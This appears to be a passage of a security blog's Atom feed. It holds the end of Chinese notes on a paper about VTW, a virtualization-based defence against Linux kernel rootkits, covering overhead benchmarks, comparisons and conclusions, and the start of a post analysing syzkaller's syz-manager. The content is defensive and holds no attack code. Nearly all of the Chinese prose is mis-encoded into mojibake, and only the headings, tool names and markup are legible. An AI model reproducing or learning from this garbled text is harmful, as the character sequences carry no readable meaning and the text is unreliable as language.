æµ‹é‡ã€‚æ‰€æœ‰çš„ç»“æœéƒ½åœ¨åŸç”Ÿæ“ä½œç³»ç»Ÿæµ‹è¯•ä¸­è¿›è¡Œäº†æ ‡å‡†åŒ–ã€‚</p><p>$Nbench\ Test$ã€‚æµ‹è¯•ç»“æœå¦‚ å›¾.8 æ‰€ç¤ºã€‚VTW å¼•å…¥äº†å°äº 2% çš„ CPU å¼€é”€ã€‚VTW æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ hypervisor ä¸”ä¸æä¾›å¦‚å…¶ä»–è™šæ‹ŸåŒ–å¹³å°ï¼ˆä¾‹å¦‚ Xenï¼‰é‚£æ ·å¤æ‚çš„è™šæ‹ŸåŒ–åŠŸèƒ½ã€‚ç”±æ­¤ï¼Œå…¶å¸¦ç»™ CPU çš„æ€§èƒ½å¼€å§‹éå¸¸å°ã€‚</p><p><img src="https://s2.loli.net/2023/04/10/B4QEyK5VCW9JviO.png" alt="å›¾.8 VTW æ–¹æ¡ˆçš„æ‰§è¡Œå¼€é”€ã€‚x-axis æ˜¾ç¤ºäº†è¿è¡Œé€Ÿåº¦æŸå¤±ç³»æ•°ï¼Œy-axie ä¸ºæ‰§è¡Œçš„åŸºå‡†æµ‹è¯•ç¨‹åº"></p><p>$Lmbench\ Test$ã€‚Lmbench è¢«ç”¨ä»¥æµ‹é‡ç³»ç»Ÿå»¶è¿Ÿä¸è´·æ¬¾ã€‚æµ‹è¯•ç»“æœå¦‚ å›¾.9aã€9bã€9c æ‰€ç¤ºã€‚VTW å¢åŠ äº†å¹³å‡ 8.8% çš„å†…å­˜ä¸ç½‘ç»œå»¶è¿Ÿä¸å¹³å‡ 5.9% çš„æ–‡ä»¶æ“ä½œå»¶è¿Ÿã€‚é€šä¿¡å¸¦å®½å‡å°‘äº† 2.2%ã€‚</p><p><img src="https://s2.loli.net/2023/04/10/crCIiGy58atvN29.png" alt="å›¾.9 å†…å­˜/ç½‘ç»œè®¿é—®å»¶è¿Ÿï¼Œæ–‡ä»¶æ“ä½œä¸ IO å¸¦å®½çš„å‡å°‘è¢«ç»˜åˆ¶ä¸ºç³»ç»Ÿå¯¹åŸºå‡†æˆ–ç½‘ç»œã€å†…å­˜ã€æ–‡ä»¶è®¿é—®æ“ä½œçš„ç™¾åˆ†æ¯”"></p><p>åœ¨ Lmbench æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å‘ç° OS åœ¨ â€œhostâ€ ä¸ â€œguestâ€ é—´çš„åˆ‡æ¢é¢‘ç‡æ˜¾è‘—åœ°å¢é•¿äº†ï¼Œå¤§éƒ¨åˆ†çš„åˆ‡æ¢ç”±æŒ‡ä»¤ $cpuid$ å¼•èµ·ã€‚ç”±äºç¼“å­˜æ“ä½œé€Ÿåº¦éå¸¸å¿«ï¼Œå…¶å¯¹äºä»»ä½•çš„å»¶è¿Ÿéƒ½æ˜¯æåº¦æ•æ„Ÿçš„ã€‚ç”±æ­¤ï¼Œåœ¨ç¼“å­˜ä¸Šçš„æ¨¡å¼åˆ‡æ¢çš„å½±å“æ˜¯å°¤å…¶æ˜æ˜¾çš„ï¼Œå¯¼è‡´äº†å°†è¿‘ 20% çš„å»¶è¿Ÿå¼€é”€ã€‚</p><p>$IOMeter Test$ã€‚IOMeter æ˜¯ç”± Intel å¼€å‘çš„ä¸€ä¸ªç”¨ä»¥æµ‹è¯•æœ€å¤§ç£ç›˜ I&#x2F;O æ€§èƒ½ä¸æœ€å¤§æ•°æ®ååé‡çš„ä¸€ä¸ªæµ‹è¯•å·¥å…·æµ‹è¯•ç»“æœå¦‚ å›¾.10aã€10b æ‰€ç¤ºï¼Œè¯¥å›¾å±•ç¤ºäº† VTW é€ æˆäº†å¹³å‡ 8.9% çš„ I&#x2F;O å¸¦å®½å‡å°‘ï¼Œä¸å¹³å‡ 3.9% çš„è¿è¡Œæ—¶é—´å¢é•¿ã€‚</p><p><img src="https://s2.loli.net/2023/04/10/NRl3YwFcbPjtvEC.png" alt="I/Oè¡¨ç°å¼€é”€ç»˜åˆ¶ä¸º I/O å¸¦å®½æŸå¤±ç³»æ•°ä¸ I/O æ—¶é—´å¢é•¿ "></p><p>VTW åœ¨ I&#x2F;O ä¸Šçš„å½±å“ä¸»è¦ç”± I&#x2F;O æ“ä½œçš„è¿è¡Œæ—¶é—´å¯¼è‡´ï¼Œè¿™å‡å°‘äº† I&#x2F;O ååé‡ä¸”å¢åŠ äº† I&#x2F;O å“åº”æ—¶é—´ã€‚ç”± VTW å¼•å…¥çš„å¼€é”€åŒ…æ‹¬å­˜å‚¨ä¸è®¡ç®—å¼€é”€ã€‚</p><p>å­˜å‚¨å¼€é”€ä¸»è¦æŒ‡å†…å­˜å¼€é”€ï¼ŒåŒ…æ‹¬å†…å­˜ç©ºé—´å¼€é”€ä¸å¯»å€æ—¶é—´å¼€é”€ã€‚ VTW å ç”¨ä¸å¤šäº 200KB çš„å†…å­˜ç©ºé—´æ¥å­˜å‚¨å…¶æ ¸å¿ƒä»£ç ä¸æ•°æ®ï¼Œä»¥åŠ 64KB ä»¥å­˜å‚¨è¢«ä¿æŠ¤çš„å†…æ ¸æ•°æ®ã€‚</p><p>è®¡ç®—å¼€é”€æ¥è‡ªç”± VTW å¸¦æ¥çš„äº‹ä»¶æ³¨å…¥ã€å†…æ ¸ä¿æŠ¤ä¸å¼‚å¸¸å¤„ç†ï¼Œè¿™äº›æ“ä½œå°†é€ æˆæ“ä½œç³»ç»Ÿä» guest æ¨¡å¼é™·å…¥ â€œhostâ€ æ¨¡å¼ã€‚</p><p>åœ¨ host æ¨¡å¼ä¸­ï¼ŒVTW å°†æ¥ç®¡æ§åˆ¶æµå¹¶è¿›è¡Œå¼‚å¸¸å¤„ç†ã€‚åœ¨å¼‚å¸¸å¤„ç†å®Œæˆä¹‹åï¼ŒVTW å°†æ“ä½œç³»ç»Ÿåˆ‡æ¢å› â€œguestâ€ æ¨¡å¼ï¼Œå¹¶å°†æ§åˆ¶æµè¿”è¿˜ç»™æ“ä½œç³»ç»Ÿè¿›è¡Œåç»­æ‰§è¡Œã€‚</p><p>åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ â€œguestâ€ æ¨¡å¼çš„æ‰§è¡Œå§‹ç»ˆæ˜¯è¢«é˜»å¡çš„ï¼Œå› æ­¤å¦‚æ‰§è¡Œé€Ÿåº¦ã€å»¶è¿Ÿã€ç½‘ç»œå»¶è¿Ÿã€I&#x2F;O ååè¿™æ ·çš„è¡¨ç°æŒ‡ç¤ºå™¨å°†ä¼šå—åˆ°å½±å“ã€‚æ­¤å¤–ï¼Œæ¨¡å¼åˆ‡æ¢é€ æˆå¯¹ TLB ä¸ç¼“å­˜çš„åˆ·æ–°ï¼Œè¿™å°†å¢åŠ å¯¹æ“ä½œç³»ç»Ÿçš„æ€§èƒ½å½±å“ã€‚</p><p>å½“ VTW æ­£åœ¨è¿è¡Œï¼Œå¯¼è‡´æ“ä½œç³»ç»Ÿè¿›è¡Œæ¨¡å¼åˆ‡æ¢çš„å› ç´ åŒ…æ‹¬æŒ‡ä»¤é™·å…¥ä¸äº‹ä»¶é™·å…¥ï¼Œå‰è€…ç”±å¯¹ç‰¹å®šæŒ‡ä»¤çš„æ‰§è¡Œè§¦å‘ï¼Œåè€…ç”±ç‰¹å®šäº‹ä»¶è§¦å‘ã€‚åœ¨ guest æ¨¡å¼ä¸­ï¼Œå¯¹æŒ‡ä»¤ CPUIDã€GETTSECã€INVDã€XSETBV ä¸é™¤äº† VMFUNC ä»¥å¤–çš„æ‰€æœ‰ VMX æŒ‡ä»¤éƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿæ— æ¡ä»¶åœ°é™·å…¥åˆ° â€œhostâ€ã€‚</p><p>è§¦å‘æ“ä½œç³»ç»Ÿæ¨¡å¼åˆ‡æ¢çš„äº‹ä»¶åŒ…æ‹¬æ¨¡å—åŠ è½½ã€æ¨¡å—å¸è½½ã€åœ¨æ¨¡å—åŠ è½½æ—¶çš„çŠ¶æ€åˆ‡æ¢ã€æ¨¡å—é—´çš„è·³è½¬ä¸æ§åˆ¶æµè¿”å›ã€æ¨¡å—è°ƒåº¦æ‰§è¡Œã€â€œhostâ€ ç§æœ‰é¡µè¡¨çš„æ›´æ–°ã€ç¯¡æ”¹é™æ€å†…æ ¸æ•°æ®ã€å•æ­¥è°ƒè¯•æ¨¡å¼ã€åŠ¨ä½œå›æ”¾ã€‚</p><p>$Impact on the Execution Speed of LKM$ã€‚ä¸ºäº†æµ‹é‡ VTW åœ¨ LKM æ‰§è¡Œé€Ÿåº¦ä¸Šçš„å½±å“ï¼Œæˆ‘ä»¬å¼•å…¥äº†ä¸¤ä¸ªæµ‹è¯•æ¨¡å— $LKM_1$ ä¸ $LKM_2$ ï¼Œä»–ä»¬åˆ†åˆ«å±äº CPU å¯†é›†å‹ä¸ I&#x2F;O å¯†é›†å‹çš„æ¨¡å—ï¼Œå‰è€…ç”¨ä»¥è®¡ç®— $\pi$ çš„å€¼ï¼Œåè€…ç”¨ä»¥è¯»å†™æ–‡ä»¶ã€‚</p><p>æµ‹è¯•ç»“æœå¦‚ å›¾.11 æ‰€ç¤ºã€‚æ¨ªåæ ‡ä¸ºå®çº¿æŒ‡ç¤ºäº† $\pi$ å°æ•°ç‚¹åçš„ä½æ•°ï¼Œä¸æ–‡ä»¶æ“ä½œæ•°é‡ç›¸å…³çš„ä¸ºç‚¹çº¿ã€‚çºµåæ ‡æŒ‡ç¤ºäº†é€Ÿåº¦æŸå¤±é€Ÿç‡ã€‚</p><p><img src="https://s2.loli.net/2023/04/10/LwJ8WEfkNdTosPb.png" alt="å›¾.11 LKM é€Ÿåº¦æŸå¤±ç³»æ•°ä¸ Î  çš„å°æ•°ä½æ•°ç»˜åˆ¶ä¸ºå®çº¿ï¼ŒI/O æ“ä½œçš„æ•°é‡ç»˜åˆ¶ä¸ºç‚¹çº¿"></p><p>ä¸æ­¤ç›¸åï¼Œå½“æ¨¡å—è¿è¡Œè¾ƒé•¿ä¸€æ®µæ—¶é—´æ—¶ï¼Œç”± VTW é€ æˆçš„æ€§èƒ½æŸå¤±æ¯”ä¾‹æ›´å°ã€‚å¯¹äºæ™®é€š LKMs è€Œè¨€ï¼ŒVTW ä»…åœ¨ä»–ä»¬è¢«åŠ è½½ä»¥åŠçŠ¶æ€è¢«æ›´æ–°æ—¶å¹²æ¶‰ä»–ä»¬çš„æ‰§è¡Œã€‚ç”± VTW é€ æˆçš„ â€œguestâ€ çš„é˜»å¡æ—¶é—´æ˜¯æ¯”è¾ƒå›ºå®šçš„ã€‚å½“ LKM çš„æ‰§è¡Œæ—¶é—´è¾ƒçŸ­æ—¶ï¼ŒVTW ä¼šé˜»å¡ â€œguestâ€ æ¨¡å¼æ›´å¤šæ¯”ä¾‹çš„æ—¶é—´ï¼Œç”±æ­¤æ€§èƒ½æŸå¤±ç³»æ•°ä¼šå˜å¾—æ›´å¤§ã€‚</p><p>é™·é˜±çš„æ•°é‡ä¸åœ¨æ¨¡å—é—´çš„æ§åˆ¶æµè·³è½¬çš„æ•°é‡ä¸ºå½±å“ LKM æ‰§è¡Œé€Ÿåº¦çš„å…³é”®å› ç´ ã€‚æˆ‘ä»¬ä»¥ä¸€ä¸ªè¿è¡Œæ—¶é—´å¤§çº¦ 7.6s çš„ $LKM_3$ ä½œä¸ºæµ‹è¯•å¯¹è±¡ï¼Œå¹¶æµ‹é‡äº†é™·é˜±æ•°é‡åœ¨å…¶æ‰§è¡Œé€Ÿåº¦ä¸Šçš„å½±å“ã€‚</p><p>æˆ‘ä»¬é‡å†™äº† $LKM_1$ ä¸ $LKM_2$ ä½¿å¾—æ§åˆ¶æµåœ¨å…¶é—´è·³è½¬ï¼Œ ä»–ä»¬å¯ä»¥è¢«ç”¨ä»¥æµ‹é‡è·³è½¬æ¬¡æ•°å¯¹ LKM æ‰§è¡Œé€Ÿåº¦çš„å½±å“ã€‚å®éªŒç»“æœå¦‚ å›¾.12 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/11/p4HBzul5Tcj9iRm.png" alt="å›¾.12 ç³»ç»Ÿé™·é˜±ä¸æ§åˆ¶æµè·³è½¬åœ¨ LKM æ‰§è¡Œé€Ÿåº¦ä¸Šçš„å½±å“"></p><p>ç‚¹çº¿æ˜¾ç¤ºäº†å½“é™·é˜±æ•°é‡è¾ƒå°‘æ—¶ VTW åœ¨ LKM çš„æ‰§è¡Œé€Ÿåº¦ä¸Šçš„å½±å“æ˜¯è¾ƒå°çš„ã€‚å½“é™·é˜±æ•°é‡è¶…è¿‡ 1000000 æ—¶ï¼ŒLKM çš„æ‰§è¡Œå°†ä¼šå‡é€Ÿåˆ° 80%ã€‚å®çº¿æ˜¾ç¤ºäº†å½“è·³è½¬æ•°é‡è¶…è¿‡ 100 æ—¶ï¼ŒVTW å‡é€Ÿåˆ°äº† 8%ã€‚å½“è·³è½¬æ•°é‡è¶…è¿‡ 1000 æ—¶ï¼Œ LKM çš„æ‰§è¡Œé€Ÿåº¦å°†ä¼šæ€¥å‰§å‡å°ã€‚</p><p>æ§åˆ¶æµè·³è½¬å¯¹ LKM æ‰§è¡Œçš„å½±å“æ¯”é™·é˜±æ›´å¤§ã€‚ä¸€ä¸ªå®Œæ•´çš„è·³è½¬ä¸è¿”å›æ¶‰åŠåˆ°ä¸¤ä¸ªæ¨¡å¼åˆ‡æ¢ä¸å››ä¸ªä»£ç æ‰§è¡Œæƒé™ï¼Œå› æ­¤ VTW åœ¨å¤„ç†æ¨¡å—é—´è·³è½¬æ—¶ä¼šé‡åˆ°æ›´å¤šçš„å¼€é”€ï¼Œ</p><h2 id="7-4-Comparison-With-Other-Defence-Schemes"><a href="#7-4-Comparison-With-Other-Defence-Schemes" class="headerlink" title="7.4 Comparison With Other Defence Schemes"></a>7.4 Comparison With Other Defence Schemes</h2><p>åœ¨ è¡¨.6 ä¸­ï¼Œæˆ‘ä»¬å°† VTW çš„è¡¨ç°ä¸ä¸ƒä¸ªå·²çŸ¥ rootkit é˜²å¾¡æ–¹æ¡ˆå¯¹æ¯”ã€‚å¤§éƒ¨åˆ†å…¶ä»–çš„ rootkit é˜²æŠ¤æ–¹æ¡ˆåº”ç”¨äº†è™šæ‹Ÿæœºçš„å†…çœæŠ€æœ¯ï¼Œè¿™ä¸ VTW ä¸»è¦åŸºäºäº‹ä»¶è¿½è¸ªçš„æ–¹æ¡ˆæ˜¯éå¸¸ä¸åŒçš„ã€‚</p><p><img src="https://s2.loli.net/2023/04/11/1wYp3xarzkyiXSF.png" alt="è¡¨.6 VTW æ–¹æ¡ˆä¸å…¶ä»–é˜²æŠ¤æ–¹æ¡ˆå¯¹æ¯”"></p><p>æˆ‘ä»¬ä»å››ä¸ªè¡¨ç°é¢†åŸŸå¯¹ä»–ä»¬è¿›è¡Œå®šæ€§æ¯”è¾ƒï¼š$æ£€æµ‹ã€é˜²æŠ¤ã€å¯è¿½è¸ªæ€§ã€å¯ç§»æ¤æ€§$ã€‚VTW åœ¨è¿™å››ä¸ªé¢†åŸŸæœ‰ç€å¦‚å‰æ–‡æ‰€è¿°çš„æ˜¾è‘—çš„ä¼˜ç‚¹ã€‚åœ¨æœªæ¥çš„å·¥ä½œä¸­éœ€è¦æ›´å¤šçš„åŸºå‡†æµ‹è¯•å®éªŒä»¥æ­ç¤ºä¸€äº›å®šé‡çš„ç»“æœã€‚</p><p>æˆ‘ä»¬çš„ VTW ä»…è¢«è®¾è®¡ä»¥æ”¯æŒ Intel å¤„ç†å™¨åŠä»…ä¿æŠ¤åŸºäº Linux çš„ x86 æœåŠ¡å™¨ã€‚å½“å‰çš„ VTW ç‰ˆæœ¬å¹¶ä¸æ”¯æŒè¿è¡Œ Windows æˆ–å…¶ä»–æ“ä½œç³»ç»Ÿå¹³å°çš„æœåŠ¡å™¨ã€‚ç„¶è€Œï¼ŒVirtuoso æ–¹æ¡ˆå·²ç»æŠ¥å‘Šäº†å…¶åœ¨ä¸åŒå¹³å°ä¸Šçš„é«˜å¯ç§»æ¤æ€§ã€‚</p><p>æ ¹æ®è§£å†³æ¶æ„è½¯ä»¶å˜ç§çš„èƒ½åŠ›ï¼Œæˆ‘ä»¬å°†æ£€æµ‹ã€é˜²æŠ¤ã€å¯è¿½è¸ªæ€§èƒ½åŠ›åˆ†ä¸ºä¸‰ä¸ªçº§åˆ«ï¼šå¥½ã€ä¸€èˆ¬ã€å·®ã€‚</p><p>å¯¹äº rootkit æ£€æµ‹ï¼ŒVTWã€Xtierã€Virtuosoã€RTKDSM éƒ½è¢«è¯„ä¸ºå¥½ã€‚å¯¹äºé˜²æŠ¤ä¸å¯è¿½è¸ªæ€§ï¼Œæ‰€æœ‰çš„æ–¹æ¡ˆéƒ½è¢«è¯„ä¸ºä¸€èˆ¬æˆ–å·®ï¼Œä»…æœ‰ DIKernel å±•ç¤ºäº†ä¸€äº›é˜²æŠ¤èƒ½åŠ›ã€‚ä¸ VTW ç±»ä¼¼ï¼Œæ‰€æœ‰æŠ¥é“çš„æ–¹æ¡ˆéƒ½è¿è¡Œåœ¨ x86 å¤„ç†å™¨ï¼Œé™¤äº† DIKernel åœ¨ arm-v7ã€‚</p><p>æˆ‘ä»¬çš„å®éªŒæ­ç¤ºäº†ä¸€äº›åœ¨ CPU ä¸Šçš„æµ‹é‡ç»“æœä¸å­˜å‚¨å¼€é”€ã€‚å¦‚ä¸ è¡¨.6 ä¸­å‰©ä½™çš„æ–¹æ¡ˆå¯¹æ¯”æ‰€ç¤ºï¼ŒVTW åœ¨å®æ–½æ‰€æœ‰çš„é˜²æŠ¤ä¸è¿‡æ»¤æ“ä½œçš„ç³»ç»Ÿå¼€é”€ä¸Šå±•ç°äº†æ˜¾è‘—çš„ä¼˜åŠ¿ã€‚ç‰¹åˆ«çš„ï¼Œæˆ‘ä»¬æƒ³è¦æŒ‡å‡ºä½¿ç”¨ VMST ä¸ PTKDSM æ–¹æ¡ˆçš„è¿‡åº¦å¼€é”€ã€‚</p><h1 id="8-Concluding-Remarks"><a href="#8-Concluding-Remarks" class="headerlink" title="8 Concluding Remarks"></a>8 Concluding Remarks</h1><p>æœ¬è®ºæ–‡æå‡ºäº†ä¸€ç§æ–°çš„è™šæ‹ŸåŒ–å¢™ï¼ˆvirtual wallï¼ŒVTWï¼‰æ–¹æ¡ˆä»¥åœ¨ Linux æœåŠ¡å™¨ä¸Šè¿‡æ»¤å†…æ ¸ rootkitã€‚æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è¯æ˜äº†æˆ‘ä»¬çš„ VTW é˜²æŠ¤æ–¹æ¡ˆåœ¨ rootkit çš„æ£€æµ‹ã€é˜²æŠ¤ã€å¯è¿½è¸ªæ€§ä¸Šæœ‰ç€è¾ƒå¥½çš„è¡¨ç°ã€‚VTW æ¯”å…¶ä»–ä»»ä½• rootkit é˜²æŠ¤ç³»ç»Ÿçš„å†…å­˜ä¸å­˜å‚¨å¼€é”€éƒ½è¦ä½å¾—å¤šã€‚</p><p>æ‰€æœ‰åœ¨ guest æ¨¡å¼ä¸‹æŸåå®‰å…¨ç­–ç•¥çš„æ“ä½œéƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿé™·å…¥åˆ° host æ¨¡å¼ä¸­ï¼ŒVTW åˆ©ç”¨ä¸€ç§å†…å­˜è®¿é—®æ§åˆ¶æœºåˆ¶ä¸ä¸€ä¸ªäº‹ä»¶æ³¨å…¥æœºåˆ¶æ¥å®Œæˆ rootkit è¿‡æ»¤è¿‡ç¨‹ã€‚</p><p>æœªæ¥è¿½è¸ª LKMs çš„æ‰§è¡Œè·¯å¾„ä¸æ‰€æœ‰çš„å†…æ ¸æ”»å‡»å‚ä¸è€…ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§åŸºäº LKM æ‰§è¡Œè·¯å¾„çš„è¿½è¸ªæœºåˆ¶ã€‚æˆ‘ä»¬çš„ VTW å®æ—¶ä¿æŠ¤äº†é™æ€å†…æ ¸æ•°æ®çš„å®Œæ•´æ€§ã€‚å¯¹äºåŠ¨æ€å†…æ ¸å¯¹è±¡ï¼ŒVTW åœ¨è¿½è¸ªè¿‡ç¨‹ä¸­æ£€æµ‹å†…æ ¸æ•°æ®çš„å¯ç”¨æ€§ï¼Œç”±æ­¤æ¯ä¸ªè¢«ç ´åçš„ LKM æ•°æ®éƒ½å¯ä»¥è¢«æ£€æµ‹ä¸æ¢å¤ã€‚</p><p>æˆ‘ä»¬çš„ VTW ä½¿ç”¨é€šç”¨é˜²æŠ¤å¼‚å¸¸æ¥é˜²æ­¢æ›´å¤šçš„æŸå®³ã€‚å½“å†…æ ¸æ”»å‡»çš„å‚ä¸è€…æ¶‰åŠå¤šä¸ªå†…æ ¸ rootkits æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ£€æŸ¥ LKM çš„æ‰§è¡Œè·¯å¾„è·å¾—ä¸æ”»å‡»ç›¸å…³çš„æ‰§è¡Œå®ä½“ã€‚æˆ‘ä»¬è¿½è¸ªåœ¨ä¸€æ¬¡æ”»å‡»ä¸­æ‰€æœ‰å‚ä¸çš„å†…æ ¸ rootkitsã€‚VTW ä¸ºæ€»çš„ CPU æ—¶é—´å¢åŠ äº†é¢å¤–çš„ 2% ã€‚</p><p>æ¶ˆæçš„ä¸€é¢æ˜¯ï¼ŒVTW è¢«é™åˆ¶äºä»…èƒ½ä¿æŠ¤ Linux æœåŠ¡å™¨ã€‚æˆ‘ä»¬çš„ VTW æ–¹æ¡ˆä»…æ”¯æŒ Intel å¤„ç†å™¨ä¸ Linux ç³»ç»Ÿã€‚VTW å¹¶ä¸èƒ½åœ¨ AMDã€ARM å¤„ç†å™¨æˆ–æ˜¯è¿è¡Œ Windows çš„æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚SYRINGEã€VMSTã€DIKernel é˜²æŠ¤æ–¹æ¡ˆäº¦æ˜¯å¦‚æ­¤ã€‚</p><p>VTW å¯¹ BIOS æˆ–ç”¨æˆ·çº§çš„ rootkit æ”»å‡»çš„é˜²æŠ¤æœ‰é™ã€‚å¯¹äºå¯èƒ½æŸå®³å†…æ ¸å®Œæ•´æ€§çš„ rootkitsï¼Œä»–ä»¬å¯èƒ½ä½¿ç”¨ $&#x2F;dev&#x2F;kmem$ æˆ– $&#x2F;dev&#x2F;mem$ æˆ–å…¶ä»–æ–¹æ¡ˆï¼Œè¿™å¯ä»¥ä»æœ¬è®ºæ–‡çš„ VTW ä¸­æ‰©å±•ã€‚ç”±äºé¡µæ•°é™åˆ¶ï¼Œæˆ‘ä»¬å°†åœ¨æœªæ¥çš„å·¥ä½œä¸­ä½¿ç”¨è¿™äº›æ‰©å±•ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä»»ä½• rootkitï¼Œç»ˆå°†ç»³ä¹‹ä»¥æ³•ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="http://blog.arttnba3.cn/categories/PAPER/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€FUZZ.0x02ã€‘syzkaller - IIï¼šsyz-manageræºç åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/"/>
    <id>http://blog.arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/</id>
    <published>2023-03-01T20:33:58.000Z</published>
    <updated>2023-03-01T20:40:20.334Z</updated>
    
    <content type="html"><![CDATA[<p>å®å°±æ˜¯ğŸ‘´ã® Manager ğŸ</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>syzkaller æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„ kernel fuzzerï¼Œè™½ç„¶ç¬”è€…ä¹‹å‰æ›¾ç»ç”¨è¿‡ï¼ˆä¸è¿‡ç¬”è€…å¤ªèœäº†å•¥éƒ½æ²¡æŒ–å‡ºæ¥ï¼‰ä¹Ÿæ›¾ç²—ç•¥è¯»è¿‡æºç ï¼Œä½†æ˜¯æ²¡æœ‰å¤ªè¿‡äºä»”ç»†åˆ†æå°±æŠ›åœ¨è„‘åäº†ï¼ˆæ‚²ï¼‰</p><p>ä¸ºäº†æ·±å…¥å­¦ä¹  fuzzing theoryï¼Œç¬”è€…å†³å®šå…ˆä»è¿™ä¸ªå…¸ä¸­å…¸çš„ syzkaller æºç è¿›è¡Œåˆ†æå­¦ä¹  ï¼šï¼‰</p><h2 id="PRE-å·¥ä½œåŸç†"><a href="#PRE-å·¥ä½œåŸç†" class="headerlink" title="PRE.å·¥ä½œåŸç†"></a>PRE.å·¥ä½œåŸç†</h2><p>å¯¹äº syzkaller çš„æ¶æ„ï¼Œå®˜æ–¹ç»™å‡ºäº†è¿™æ ·çš„ä¸€å¼  Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><p>syzkaller æ•´ä½“ä¸Šä¸ºä¸€ä¸ª<strong>åŒæœºè°ƒè¯•ç»“æ„</strong>ï¼šç”±ä¸€å°æœºå™¨è´Ÿè´£ç®¡æ§æ•´ä¸ª fuzzing æµç¨‹ï¼ˆæœ¬æ–‡ç§°ä¸º <code>Host</code>ï¼‰ï¼Œåœ¨å¦ä¸€å°æœºå™¨ä¸Šè¿›è¡Œ fuzzingï¼ˆæœ¬æ–‡ç§°ä¸º <code>Guest</code>ï¼‰ï¼ŒGuest é€šå¸¸ä¸ºè™šæ‹Ÿæœºï¼Œä»è€Œèƒ½è®© Host æ›´å¥½åœ°ç®¡æ§æ•´ä¸ªæµç¨‹</p><p>syzkaller åˆ†ä¸ºä¸‰å¤§ç»„ä»¶ï¼š</p><ul><li><p>ä½äº Hostï¼š</p><ul><li><code>syz-manager</code> ï¼šsyzkaller çš„æ§åˆ¶ä¸­æ¢ï¼Œå…¶ä¼šå¯åŠ¨å¤šä¸ª VM å®ä¾‹ï¼ˆå¦‚å›¾æ‰€ç¤ºçš„ä¸€ä¸ªé»„è‰²å¡ç‰‡å°±æ˜¯ä¸€ä¸ªå®ä¾‹ï¼‰å¹¶è¿›è¡Œç›‘è§†ï¼ŒåŒæ—¶é€šè¿‡ RPC æ¥å¯åŠ¨ <code>syz-fuzzer</code></li></ul></li><li><p>ä½äº Guestï¼š</p><ul><li><code>syz-fuzzer</code> ï¼šè´Ÿè´£å¼•å¯¼æ•´ä¸ª fuzz çš„è¿‡ç¨‹ï¼š<ul><li>ç”Ÿæˆ input</li><li>å¯åŠ¨ <code>syz-executor</code> è¿›ç¨‹è¿›è¡Œ fuzz</li><li>ä»è¢« fuzz çš„ kernel çš„ <code>/sys/kernel/debug/kcov</code> è·å¾—è¦†ç›–ï¼ˆcoverageï¼‰çš„ç›¸å…³ä¿¡æ¯</li><li>é€šè¿‡ RPC å°†æ–°çš„è¦†ç›–å›é€åˆ° <code>syz-manager</code></li></ul></li><li><code>syz-executor</code>ï¼šè´Ÿè´£<strong>æ‰§è¡Œå•ä¸ªè¾“å…¥</strong>â€”â€”ä» <code>syz-fuzzer</code> å¤„æ¥å— input å¹¶æ‰§è¡Œï¼Œæœ€åå›é€ç»“æœ</li></ul></li></ul><p><code>syz-manager</code> ä¸º syzkaller çš„æ§åˆ¶ä¸­æ¢ï¼Œå…¶ä¼šå¯åŠ¨å¤šä¸ª VM å®ä¾‹å¹¶è¿›è¡Œç›‘è§†ï¼ŒåŒæ—¶é€šè¿‡ RPC æ¥å¯åŠ¨ <code>syz-fuzzer</code>ï¼Œæˆ‘ä»¬é€šå¸¸å¯åŠ¨ fuzzing æ—¶ä¾¿æ˜¯ä»¥ <code>syz-manager</code> ä½œä¸ºç¨‹åºå¯åŠ¨çš„å…¥å£ç‚¹ï¼Œå› æ­¤ç¬”è€…ä¹Ÿå…ˆä»æ­¤å¤„å¼€å§‹åˆ†æ</p><h1 id="0x01-åŸºæœ¬ç»“æ„ä½“"><a href="#0x01-åŸºæœ¬ç»“æ„ä½“" class="headerlink" title="0x01. åŸºæœ¬ç»“æ„ä½“"></a>0x01. åŸºæœ¬ç»“æ„ä½“</h1><p>ç›¸æ¯”äºç›´æ¥å¼€å§‹åˆ†ææºç ï¼Œç¬”è€…è®¤ä¸ºæœ‰å¿…è¦åœ¨æ­¤ä¹‹å‰å…ˆåˆ—å‡ºä¸€äº›åŸºæœ¬çš„ç»“æ„ä½“ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠè¿™ä¸€èŠ‚å½“æˆä¸€ä¸ªè¡¨æ¥æŸ¥ ï¼šï¼‰</p><h2 id="VM-ç®¡æ§ç›¸å…³"><a href="#VM-ç®¡æ§ç›¸å…³" class="headerlink" title="VM ç®¡æ§ç›¸å…³"></a>VM ç®¡æ§ç›¸å…³</h2><p>Host éœ€è¦å»æ„ŸçŸ¥ä¸ç®¡æ§ Guest VMsï¼Œå› è€Œåœ¨ <code>syz-manager</code> 